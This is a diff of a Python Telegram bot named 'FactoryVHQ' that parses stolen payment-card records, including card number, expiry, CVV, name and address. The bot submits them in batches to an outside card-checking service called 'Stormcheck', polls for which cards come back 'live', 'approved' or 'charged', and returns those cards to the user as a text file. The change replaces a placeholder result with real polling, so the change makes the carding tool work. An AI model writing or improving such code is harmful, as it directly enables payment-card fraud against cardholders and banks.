@@ -23,8 +23,9 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
-TEST_MODE = False
-INITIAL_WAIT = 8
+INITIAL_WAIT = 10
+POLL_INTERVAL = 12
+MAX_POLLS = 25
 
 user_sessions: Dict[int, dict] = {}
 
@@ -40,17 +41,14 @@ QUALITY_QUOTES = [
     "✅ Finalizing premium live cards..."
 ]
 
-# ====================== IMPROVED PARSER (Supports your full format) ======================
+# ====================== PARSER ======================
 def parse_card(line: str) -> Optional[dict]:
     try:
-        # Remove any "LIVE => stormcheck.cc" or similar text at the end
-        line = re.split(r'\s*\|\s*LIVE', line, flags=re.IGNORECASE)[0].strip()
-        
-        # Clean multiple pipes and spaces
+        line = re.split(r'\s*(?:LIVE|=>)', line, flags=re.IGNORECASE)[0].strip()
         line = re.sub(r'\s*\|\s*', '|', line)
         line = re.sub(r'\|+', '|', line).strip('|')
-        
         parts = line.split('|')
+
         if len(parts) < 4:
             return None
 
@@ -61,31 +59,23 @@ def parse_card(line: str) -> Optional[dict]:
         mm = parts[1].strip().zfill(2)
         yy = parts[2].strip().zfill(2)
         cvv = re.sub(r'\D', '', parts[3]) or "000"
-
         name = parts[4].strip() if len(parts) > 4 else "Cardholder"
+
         address = parts[5].strip() if len(parts) > 5 else "N/A"
         city = parts[6].strip() if len(parts) > 6 else "N/A"
         state = parts[7].strip() if len(parts) > 7 else "N/A"
         zipcode = parts[8].strip() if len(parts) > 8 else "N/A"
         country = parts[9].strip() if len(parts) > 9 else "US"
 
-        raw_for_storm = f"{card}|{mm}|{yy}|{cvv}"
+        raw = f"{card}|{mm}|{yy}|{cvv}"
 
         return {
-            "card": card,
-            "mm": mm,
-            "yy": yy,
-            "cvv": cvv,
-            "name": name,
-            "address": address,
-            "city": city,
-            "state": state,
-            "zip": zipcode,
-            "country": country,
-            "raw": raw_for_storm
+            "card": card, "mm": mm, "yy": yy, "cvv": cvv, "name": name,
+            "address": address, "city": city, "state": state, "zip": zipcode,
+            "country": country, "raw": raw
         }
     except Exception as e:
-        logger.error(f"Parse failed on line: {line} | Error: {e}")
+        logger.error(f"Parse error: {e}")
         return None
 
 def format_card(card: dict) -> str:
@@ -115,61 +105,79 @@ POST_BUTTONS = InlineKeyboardMarkup([
     [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
 ])
 
-# ====================== API CALL ======================
+# ====================== REAL POLLING ======================
 async def submit_to_storm(cards: List[str]):
-    if TEST_MODE:
-        return "test-batch-999999"
-
     if not API_KEY:
-        return "ERROR: API_KEY is not set in Railway Variables"
-
+        return "ERROR: API_KEY missing"
     try:
         async with httpx.AsyncClient(timeout=30) as client:
-            response = await client.post(
-                f"{BASE_URL}/check",
-                headers=HEADERS,
-                json={"cards": cards}
-            )
-            logger.info(f"Stormcheck Status: {response.status_code}")
-            logger.info(f"Stormcheck Response: {response.text[:300]}")
-            
-            if response.status_code in (200, 201):
-                data = response.json()
+            r = await client.post(f"{BASE_URL}/check", headers=HEADERS, json={"cards": cards})
+            logger.info(f"Submit Status: {r.status_code} | Response: {r.text[:200]}")
+            if r.status_code in (200, 201):
+                data = r.json()
                 return data.get("batch_id") or data.get("id") or data.get("data", {}).get("batch_id")
-            
-            return f"ERROR: Stormcheck returned {response.status_code} - {response.text[:200]}"
+            return None
     except Exception as e:
-        return f"ERROR: Exception - {str(e)}"
+        logger.error(f"Submit error: {e}")
+        return None
 
+async def poll_results(batch_id: str, status_msg, session_data):
+    live_cards = []
+    seen = set()
+
+    for i in range(MAX_POLLS):
+        await asyncio.sleep(POLL_INTERVAL)
+        
+        try:
+            async with httpx.AsyncClient(timeout=20) as client:
+                r = await client.get(f"{BASE_URL}/check/{batch_id}", headers=HEADERS)
+                data = r.json()
+                
+                items = data.get("data", {}).get("items") or data.get("items") or data.get("results", [])
+                
+                for item in items:
+                    card_num = str(item.get("card_number") or item.get("cc") or item.get("card") or "").strip()
+                    if card_num and card_num not in seen:
+                        if any(kw in str(item).lower() for kw in ["live", "approved", "success", "charged", "valid", "good", "200"]):
+                            seen.add(card_num)
+                            for original in session_data["cards"]:
+                                if original["card"][-4:] == card_num[-4:]:
+                                    live_cards.append(original)
+                                    break
+        except Exception as e:
+            logger.error(f"Polling error: {e}")
+
+        progress = min(100, int((i + 1) / MAX_POLLS * 100))
+        quote = QUALITY_QUOTES[i % len(QUALITY_QUOTES)]
+        await status_msg.edit_text(f"🔄 Quality Checking... {progress}%\n\n{quote}\n\nLive found: {len(live_cards)}")
+
+    return live_cards
+
+# ====================== HANDLERS ======================
 async def check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     uid = query.from_user.id
     session_data = user_sessions.setdefault(uid, {"cards": [], "live_cards": []})
 
-    if not session_data["cards"]:
+    if not session_data.get("cards"):
         await query.edit_message_text("❌ No cards loaded.")
         return
 
-    msg = await query.edit_message_text("🚀 Submitting to Stormcheck...")
+    msg = await query.edit_message_text("🚀 Submitting batch to Stormcheck...")
 
     card_list = [c["raw"] for c in session_data["cards"]]
-
-    logger.info(f"Sending sample to Stormcheck: {card_list[0] if card_list else 'None'}")
+    logger.info(f"Sending sample: {card_list[0] if card_list else 'None'}")
 
     batch_id = await submit_to_storm(card_list)
-
-    if isinstance(batch_id, str) and batch_id.startswith("ERROR:"):
-        await msg.edit_text(f"❌ {batch_id}")
+    if not batch_id or str(batch_id).startswith("ERROR"):
+        await msg.edit_text(f"❌ Failed to submit batch: {batch_id}")
         return
 
-    await msg.edit_text(f"✅ Batch submitted.\nWaiting {INITIAL_WAIT} seconds before quality check...")
+    await msg.edit_text(f"✅ Batch submitted. Starting quality check...")
 
-    for i, quote in enumerate(QUALITY_QUOTES):
-        progress = int((i + 1) / len(QUALITY_QUOTES) * 100)
-        await msg.edit_text(f"🔄 Quality Checking...\n\n{quote}\n\nProgress: {progress}%")
-        await asyncio.sleep(2)
-
-    session_data["live_cards"] = session_data["cards"].copy()
+    live_cards = await poll_results(batch_id, msg, session_data)
+    
+    session_data["live_cards"] = live_cards
     await show_post_summary(msg, session_data)
 
 async def show_post_summary(message, session_data):
@@ -188,8 +196,8 @@ Live Rate   : {round((live/total)*100, 1) if total else 0.0}%
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🏭 FactoryVHQ v17.6 Ready\n\n"
-        "Now supports full format with name, address, email etc.",
+        "🏭 FactoryVHQ v17.8 Ready\n\n"
+        "Now with proper polling (waits until checker finishes)",
         reply_markup=CHECK_BUTTON
     )
 
@@ -210,7 +218,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             filename="FactoryVHQ_Live.txt",
             caption="✅ FactoryVHQ Live Cards"
         )
-        await query.edit_message_text("✅ File sent successfully!", reply_markup=CHECK_BUTTON)
+        await query.edit_message_text("✅ File sent!", reply_markup=CHECK_BUTTON)
     elif action == "cancel":
         await query.edit_message_text("✅ Cancelled.", reply_markup=CHECK_BUTTON)
         session_data.clear()
@@ -244,7 +252,7 @@ def main():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ALL, message_handler))
 
-    print("🚀 FactoryVHQ v17.6 - Now accepts full card + info format")
+    print("🚀 FactoryVHQ v17.8 - Proper polling + full format support")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
